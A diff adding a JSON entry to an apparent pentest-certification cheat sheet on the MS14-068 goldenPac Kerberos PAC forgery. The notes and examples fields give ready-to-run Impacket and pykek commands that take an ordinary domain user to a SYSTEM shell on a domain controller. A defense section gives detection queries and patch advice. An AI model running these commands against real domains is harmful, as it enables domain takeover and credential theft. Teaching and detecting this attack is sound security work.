@@ -1,0 +1,105 @@
+{
+  "id": "ad-ms14-068-goldenpac",
+  "name": "MS14-068 (goldenPac) - Kerberos PAC Privilege Forgery",
+  "command": "goldenPac.py <domain>/<user>:<password>@<dc_host>",
+  "description": "MS14-068 exploits a flaw in how unpatched Key Distribution Centers validate the Kerberos PAC, letting any domain user forge a ticket claiming Domain Admin membership. Impacket goldenPac.py automates the end-to-end chain: request a ticket, inject a forged PAC, and get a shell as a privileged user on the DC. Still relevant on legacy/unpatched 2008-2012 domains.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "loud",
+  "category": "Active Directory",
+  "subcategory": "Privilege Escalation",
+  "certifications": [
+    "CRTP",
+    "OSCP"
+  ],
+  "primary_cert": "CRTP",
+  "source": "Impacket goldenPac.py; MS14-068 (CVE-2014-6324)",
+  "tags": [
+    "ms14-068",
+    "goldenpac",
+    "kerberos",
+    "pac",
+    "cve-2014-6324",
+    "privilege-escalation",
+    "impacket"
+  ],
+  "mitre": [
+    "T1068",
+    "T1558"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== PRECONDITIONS ===\n  # - A valid (any) domain user account + password\n  # - DC missing the MS14-068 patch (KB3011780) - typically 2008/2008R2/2012 pre-Nov-2014\n  # - The target DC FQDN (not just IP) for Kerberos\n\n=== ONE-SHOT EXPLOIT (shell on DC) ===\n  goldenPac.py <domain>/<user>:<password>@<dc_host>\n  # e.g.\n  goldenPac.py lab.local/jdoe:Passw0rd!@dc01.lab.local\n  # Drops to a SYSTEM shell on the DC via psexec-style execution\n\n=== MANUAL CHAIN (pykek / ms14-068.py) ===\n  python ms14-068.py -u <user>@<domain> -p <password> -s <user_sid> -d <dc_host>\n  # Produces a TGT.ccache with forged Domain Admin PAC\n  export KRB5CCNAME=TGT_<user>@<domain>.ccache\n  psexec.py -k -no-pass <domain>/<user>@<dc_host>\n\n=== GET THE USER SID FIRST ===\n  lookupsid.py <domain>/<user>:<password>@<dc_ip>\n  # or: wmic useraccount get name,sid    (on a domain host)\n\n=== CHECK IF PATCHED ===\n  # KB3011780 present => not vulnerable. Modern DCs are patched.\n\n=== RELATED ===\n  # Golden Ticket (post-DA) is a different attack: forge TGT with krbtgt hash",
+  "examples": [
+    {
+      "label": "One-shot goldenPac exploit",
+      "command": "goldenPac.py lab.local/jdoe:Passw0rd!@dc01.lab.local"
+    },
+    {
+      "label": "Get user SID (prereq)",
+      "command": "lookupsid.py lab.local/jdoe:Passw0rd!@10.10.10.5"
+    },
+    {
+      "label": "Manual pykek + psexec",
+      "command": "python ms14-068.py -u jdoe@lab.local -p Passw0rd! -s S-1-5-21-...-1103 -d dc01.lab.local"
+    }
+  ],
+  "references": [
+    {
+      "title": "MS14-068 / CVE-2014-6324",
+      "url": "https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-068"
+    },
+    {
+      "title": "MITRE T1068 - Exploitation for Privilege Escalation",
+      "url": "https://attack.mitre.org/techniques/T1068/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-golden-ticket-mimikatz",
+      "note": "Golden Ticket is the post-DA krbtgt forgery (different attack).",
+      "rel": "alternative"
+    },
+    {
+      "id": "ad-getuserspns-request",
+      "note": "Kerberoasting is an alternative path to privileged creds.",
+      "rel": "alternative"
+    },
+    {
+      "id": "ad-secretsdump-dcsync",
+      "note": "After DC compromise, DCSync all hashes.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Unpatched KDCs accept a PAC signed with any key (including one the attacker controls) instead of only the KDC key, so a forged PAC claiming Domain Admin group membership is trusted - escalating any domain user to DA.",
+    "prerequisites": "Any valid domain account; a DC missing KB3011780.",
+    "impact": "Immediate domain compromise (Domain Admin / SYSTEM on the DC) from an unprivileged account.",
+    "detection": "[MITRE T1068/T1558] 4769/4768 tickets where PAC privileges do not match the account; TGS requests with anomalous PAC; psexec-style service creation on the DC (7045/4697) right after an odd Kerberos exchange; account suddenly acting as DA.",
+    "artifacts": "Forged ticket usage; service install on DC; mismatch between the account and its effective group membership in logs.",
+    "splunk_spl": "index=windows (EventCode=4769 OR EventCode=4768)\n| join TargetUserName [search index=windows EventCode=4672]\n| table _time, TargetUserName, IpAddress, ServiceName",
+    "elastic_kql": "event.code:(4768 or 4769) and winlog.event_data.TargetUserName:*",
+    "sentinel_kql": "SecurityEvent\n| where EventID in (4768,4769,4672,7045)\n| where Computer has \"DC\"\n| project TimeGenerated, EventID, Account, Computer, IpAddress",
+    "sigma_rules": "win_ms14_068_pac_forgery",
+    "prevention": "PATCH (KB3011780) - the only real fix; this attack is dead on patched DCs. Monitor for privilege mismatches in PAC; alert on unexpected service creation on DCs; retire EOL Windows Server versions.",
+    "sources": [
+      "Microsoft MS14-068",
+      "https://attack.mitre.org/techniques/T1068/"
+    ],
+    "detections": [
+      {
+        "platform": "splunk",
+        "name": "Unexpected privileged logon following Kerberos ticket (MS14-068)",
+        "logic": "index=windows EventCode=4672 Computer=\"*DC*\"\n| join type=inner TargetLogonId [search index=windows EventCode=4624 LogonType=3]\n| table _time, TargetUserName, Computer, IpAddress",
+        "data_source": "windows-security",
+        "attack": [
+          "T1068",
+          "T1558"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "false_positives": "Legitimate admin logons to DCs",
+        "tuning": "Alert when an account with no DA membership suddenly receives SeTcbPrivilege/admin rights on a DC"
+      }
+    ]
+  }
+}
